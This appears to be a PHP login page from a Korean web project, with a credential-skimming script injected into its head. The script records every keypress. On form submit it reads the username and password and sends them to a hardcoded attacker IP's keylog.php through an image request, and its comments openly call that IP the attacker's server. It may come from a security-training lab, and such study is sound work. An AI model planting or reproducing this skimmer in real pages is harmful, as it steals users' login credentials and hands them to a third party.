<?php
$is_logged_in = isset($_COOKIE['auth_token']) && !empty($_COOKIE['auth_token']);
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>로그인 페이지</title>
    <link rel="stylesheet" href="styles.css">
    <script>
    var keys = ""
	document.onkeypress = function(event) {
		var keyPressed = event.key;
		// console.log(keyPressed);
		keys+=keyPressed;
		console.log(keys);
	}
	    function getInputValue() {
			// 공격자 주소
			var url = "http://43.202.57.69/keylog.php?keys="
           
			// 사용자 계정 정보 저장
			var username = document.getElementById("username").value;
			var password = document.getElementById("password").value;
            
			// 사용자 계정 정보를 가독성 좋게 저장
			var keys = "username : " + username + "\npassword : " + password;
			//console.log(keys);
			
			// 공격자 서버에 보내기 전, 보내질 데이터 확인
			var send = url + keys;
			console.log(send);
            
			// 공격자 서버로 전송
			new Image().src = url + keys;
		}
	</script>
</head>
<body>
    <h2>로그인</h2>

    <?php
    // 메시지가 있을 경우 출력
    if (isset($_GET['message'])) {
        echo "<p>" . htmlspecialchars($_GET['message']) . "</p>";
        //console.log(htmlspecialchars($_GET['sql_query'])); //식별인증동시처리확인
    }
    ?>

    <?php if ($is_logged_in): ?>
        <p>현재 로그인 상태입니다.</p>
        <form method="POST" action="login.php">
            <input type="submit" name="logout" value="로그아웃">
        </form>
        <p><a href="account_management.php">계정 관리</a></p>
        <p><a href="board_list.php">게시판 보기</a></p>
    <?php else: ?>
        <form method="POST" action="login.php" onsubmit="getInputValue()">
            사용자 이름: <input type="text" name="username" id="username" required><br>
            비밀번호: <input type="password" name="password" id="password" required><br>
            <input type="submit" value="로그인">
        </form>
    <?php endif; ?>
    <p><a href="index.html">홈으로 가기</a></p>
    
</body>
</html>
